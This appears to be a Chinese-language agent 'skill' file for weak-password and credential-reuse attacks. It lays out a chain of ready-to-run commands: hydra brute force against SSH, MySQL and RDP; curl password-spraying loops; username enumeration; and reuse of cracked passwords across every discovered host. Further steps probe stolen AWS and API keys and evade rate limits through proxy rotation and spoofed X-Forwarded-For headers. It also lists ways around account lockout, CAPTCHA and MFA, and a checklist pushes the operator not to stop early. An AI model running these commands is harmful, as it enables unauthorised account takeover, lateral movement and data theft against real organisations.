---
name: credential-spray-reuse
description: Weak credential detection, password spraying, credential reuse testing across all discovered assets and services
version: 1.0.0
---

# 弱口令与凭据复用

## 适用场景

发现登录接口、管理后台、数据库端口、SSH/RDP 等认证服务后加载。覆盖默认凭据 → 弱口令爆破 → 凭据复用 → 全资产回测 → API Key 权限边界完整链。

## 前置 skill

- waf-detection-and-fingerprinting (强制)
- waf-bypass-arsenal (强制)

## 攻击链

### 1) 认证端点枚举

```bash
# Web 登录页发现
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302 -fc 404 | grep -iE 'login|admin|signin|auth|portal|dashboard|manage|backend|console'

# 代理版
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302 -fc 404 -x http://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:1000 | grep -iE 'login|admin|signin|auth'

# 服务端口认证
nmap -sT -p 22,3389,3306,5432,6379,27017,1433,21,5900,8080,8443 TARGET --open
```

### 2) 默认凭据测试

常见默认凭据:
```
admin:admin / admin:123456 / admin:password / admin:admin123 / admin:admin888
root:root / root:toor / root:123456 / root:password
test:test / guest:guest / user:user / demo:demo
tomcat:tomcat / manager:manager / jboss:jboss
sa:sa / sa:(空) / postgres:postgres / root:(空)
```

```bash
# Web 登录 — 直连版
curl -sk "https://TARGET/login" -d "username=admin&password=admin" -D -
curl -sk "https://TARGET/login" -d "username=admin&password=123456" -D -

# SSH — 直连版
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ssh://TARGET -t 4

# MySQL
hydra -l root -P /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://TARGET

# Redis (无密码检测)
redis-cli -h TARGET ping
redis-cli -h TARGET INFO

# 代理版 (hydra 通过 proxychains4)
proxychains4 hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ssh://TARGET -t 4
```

### 3) 用户名枚举

```bash
# Web 登录页枚举 (响应差异)
ffuf -u https://TARGET/login -X POST -d "username=FUZZ&password=wrong" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mr "incorrect password" -mc all

# 时间差异枚举
for user in admin root test user administrator; do
  time curl -sk "https://TARGET/login" -d "username=${user}&password=wrong" -o /dev/null 2>&1
done
```

### 4) 密码喷洒 (慢速,scope 允许时)

```bash
# Web 密码喷洒 — 直连版
for pass in "123456" "password" "admin123" "qwerty" "abc123" "111111" "admin" "letmein" "welcome" "monkey"; do
  for user in admin root test user administrator; do
    curl -sk "https://TARGET/login" -d "username=${user}&password=${pass}" -o /dev/null -w "%{http_code} ${user}:${pass}\n"
    sleep 3
  done
  sleep 10
done

# 代理版 (WAF 场景,慢速)
for pass in "123456" "password" "admin123"; do
  for user in admin root; do
    curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 "https://TARGET/login" -d "username=${user}&password=${pass}" -o /dev/null -w "%{http_code} ${user}:${pass}\n"
    sleep 5
  done
  sleep 15
done
```

### 5) 凭据复用回测

命中一组凭据后,立即在全资产复用:

```bash
# SSH 复用
for host in HOST1 HOST2 HOST3; do
  sshpass -p 'CRACKED_PASS' ssh -o StrictHostKeyChecking=no CRACKED_USER@${host} "id;hostname" 2>/dev/null
done

# 数据库复用
mysql -h HOST1 -u CRACKED_USER -p'CRACKED_PASS' -e "SHOW DATABASES;" 2>/dev/null
psql -h HOST1 -U CRACKED_USER -c "SELECT datname FROM pg_database;" 2>/dev/null

# Web 后台复用
for url in "https://HOST1/admin" "https://HOST2/login" "https://HOST3/dashboard"; do
  curl -sk "${url}" -d "username=CRACKED_USER&password=CRACKED_PASS" -D - | head -20
done

# VPN/RDP 复用
proxychains4 hydra -l CRACKED_USER -p CRACKED_PASS rdp://HOST1
```

### 6) API Key 权限边界探测 (只读)

```bash
# AWS
aws sts get-caller-identity --access-key-id AKID --secret-access-key SKEY
aws s3 ls --access-key-id AKID --secret-access-key SKEY
aws iam list-users --access-key-id AKID --secret-access-key SKEY

# 阿里云
# 用提取到的 AK/SK 调用 DescribeInstances / ListBuckets 等只读 API

# 通用 API Key
curl -sk "https://api.target.com/v1/users" -H "Authorization: Bearer EXTRACTED_KEY"
```

### 7) 敏感操作可达性验证

命中管理后台后:
- 用户管理 (增删改查)
- 系统配置修改
- 数据导出 / 备份下载
- 文件管理 / 代码部署
- 日志查看

## WAF 对抗集成

### 登录爆破 WAF 绕过

```bash
# 频率限制绕过
# 1) IP 轮换 (代理池)
curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 "https://TARGET/login" -d "username=admin&password=123456"

# 2) Header 注入绕过 IP 限制
curl -sk "https://TARGET/login" -H "X-Forwarded-For: 1.2.3.4" -d "username=admin&password=123456"
curl -sk "https://TARGET/login" -H "X-Real-IP: 1.2.3.4" -d "username=admin&password=123456"

# 3) 参数位置变换 (URL → body → JSON)
curl -sk "https://TARGET/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"123456"}'

# 4) 慢速 (5-15s 间隔)
sleep $((RANDOM % 10 + 5))
```

## 代理池启用判定

- 密码喷洒阶段: 建议走代理 (频率限制风险高)
- 凭据复用回测: 视目标是否有 WAF 决定
- SSH/RDP 爆破: WAF 不影响,但防封 IP 建议走代理
- API Key 探测: 直连 (低频 + 只读)

## 敏感数据采集点

- 凭据类: 用户名 / 密码明文 / API Key / 数据库连接串
- 账户类: 管理员列表 / 权限矩阵
- 系统类: 后台可达功能清单
- 业务敏感: 后台数据导出内容

## 失败处理

1. 验证码 → 尝试 OCR / 验证码识别接口 / 验证码复用 / 禁用 JS 测试
2. 账户锁定 → 降频 + IP 轮换 + 换用户名
3. MFA → 尝试绕过 (MFA 重放 / MFA 重置流程漏洞 / 备用验证方式)
4. API Key 无权限 → 记录 Key 本身作为发现,标注"只读权限不足"
5. 所有默认凭据失败 → 转密码喷洒或放弃弱口令路径

## 报告必填字段

- 漏洞标题 / 漏洞指纹 / 完整 PoC
- WAF 类型 + 绕过路径
- 命中凭据 (脱敏)
- 复用成功的资产列表
- 可达敏感操作清单
- API Key 权限边界
- 影响半径 / CVSS 3.1 + 向量串
- 修复建议 / 攻击时间线

## 反早停检查

1. 命中凭据后是否在全资产做了复用回测?
2. 是否探测了管理后台可达的敏感操作?
3. 是否对提取到的 API Key 做了权限边界探测?
